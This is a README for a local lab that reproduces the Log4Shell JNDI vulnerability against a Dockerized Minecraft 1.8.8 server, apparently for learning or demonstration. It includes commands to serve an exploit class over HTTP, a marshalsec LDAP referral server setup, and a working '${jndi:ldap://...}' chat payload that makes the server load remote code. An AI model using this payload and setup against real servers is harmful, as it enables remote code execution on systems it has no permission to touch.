# Overview



## Setting up the environment

- Download [Docker](https://www.docker.com/products/docker-desktop/)
- Launch your [Minecraft](https://www.minecraft.net/en-us/download) game and install version 1.8.8 (Installations > New Installations > release 1.8.8).
- Install [Python 3+](https://www.python.org/downloads/)
- Java 8 ([build 181](https://archive.org/download/Java-Archive/Java%20SE%208%20%288u202%20and%20earlier%29/8u181/JDK/))

## Starting up the server on Docker


1. Build the docker image:
```
docker build -t linux-java-python .
```
2. Run the docker image (iterative mode):
```
docker run -it -p 25565:25565 --name mcserver linux-java-python
```

3. The command above starts up a bash on the Docker container. Now you will run this command on the container's bash:

```
java -Xms2G -Xmx2G -jar minecraft_server.1.8.8.jar
```

After the steps above, the minecraft server is now running on the docker container.

## Preparing the Exploit

1. Compile the exploit using Java 8 (build 181):
```
javac8 MinecraftLog4J.java
```

***Above I use javac8 because I have an alias in my machine to point to Java v1.8_u181***

2. Start an HTTP server on current folder to serve the exploit's .class file.
```
python3 -m http.server 8000 
```


## Running the JNDI/LDAP Server

1. Go the marshalsec subfolder (`cd masharlsec`)
2. Run the LDAPRefServer  using 

```
java8 -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#MinecraftLog4J 1389
```



## Connect to the Minecraft Server from the Host Machine

After running the Docker container, you should be able to connect to the Minecraft server from the host machine:

1. Launch the Minecraft game on your host machine (release 1.8.8).
2. Select "Multiplayer"
3. Click "Add Server" and enter the following:
- Server Name: Any name you like.
- Server Address: localhost (or 127.0.0.1).
- Save and click "Join Server" to connect.

4. Once in game, type in chat:

```
${jndi:ldap://host.docker.internal:1389/MinecraftLog4J}
```
